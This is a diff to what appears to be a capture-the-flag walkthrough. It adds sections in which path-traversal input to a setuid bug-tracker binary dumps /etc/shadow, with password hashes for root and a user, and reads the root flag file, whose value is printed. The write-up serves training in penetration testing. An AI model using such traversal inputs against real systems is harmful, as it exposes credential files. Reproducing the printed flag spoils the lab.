@@ -595,7 +595,49 @@ We see that the cat command is used in an insecure way.&#x20;
 
 ### Shadow dump
 
-### Root user FLAG
+We can perform a path injection in the user input section to get the contents of the `/etc/shadow` file. It requires root user privileges and this can help us gaining so.
+
+```
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: ../../../etc/shadow
+../../../etc/shadow
+---------------
+
+root:$6$eD0n5saZ$orykpdd7mVL/lF57rIGwUzeSROPC1KRITJ45Nqn6P2BLaZ.tcSOy5fNFcOw9uBRkClgu5R9WlyxpEId5qOOVY.:18285:0:99999:7:::
+daemon:*:18113:0:99999:7:::
+bin:*:18113:0:99999:7:::
+sys:*:18113:0:99999:7:::
+sync:*:18113:0:99999:7:::
+games:*:18113:0:99999:7:::
+man:*:18113:0:99999:7:::
+lp:*:18113:0:99999:7:::
+mail:*:18113:0:99999:7:::
+news:*:18113:0:99999:7:::
+uucp:*:18113:0:99999:7:::
+proxy:*:18113:0:99999:7:::
+www-data:*:18113:0:99999:7:::
+backup:*:18113:0:99999:7:::
+list:*:18113:0:99999:7:::
+irc:*:18113:0:99999:7:::
+gnats:*:18113:0:99999:7:::
+nobody:*:18113:0:99999:7:::
+systemd-network:*:18113:0:99999:7:::
+systemd-resolve:*:18113:0:99999:7:::
+syslog:*:18113:0:99999:7:::
+messagebus:*:18113:0:99999:7:::
+_apt:*:18113:0:99999:7:::
+lxd:*:18113:0:99999:7:::
+uuidd:*:18113:0:99999:7:::
+dnsmasq:*:18113:0:99999:7:::
+landscape:*:18113:0:99999:7:::
+pollinate:*:18113:0:99999:7:::
+sshd:*:18284:0:99999:7:::
+robert:$6$kriHoPwv$iBt45Fu0g4R0uNWSubfjDRvtUSwxVu.U1JhYKmT4voMWlVc3/u2nu0j0JZL0YWmm62vRgAs4acBl8Ge.S393H/:18285:0:99999:7:::
+mysql:!:18284:0:99999:7:::
+```
 
 ### Privilege Escalation
 
@@ -617,7 +659,24 @@ echo $PATH
 
 Now executing the bugtracker binary gives us shell access:
 
+### Root FLAG
 
+We can find the root user flag in /root/root.txt using the bugtracker binary without privilege escalation:
+
+```
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: ../../../../root/root.txt
+../../../../root/root.txt
+---------------
+
+af13b0bee69f8a877c3faf667f7beacf
+
+*** stack smashing detected ***: <unknown> terminated
+Aborted (core dumped)
+```
 
 
 
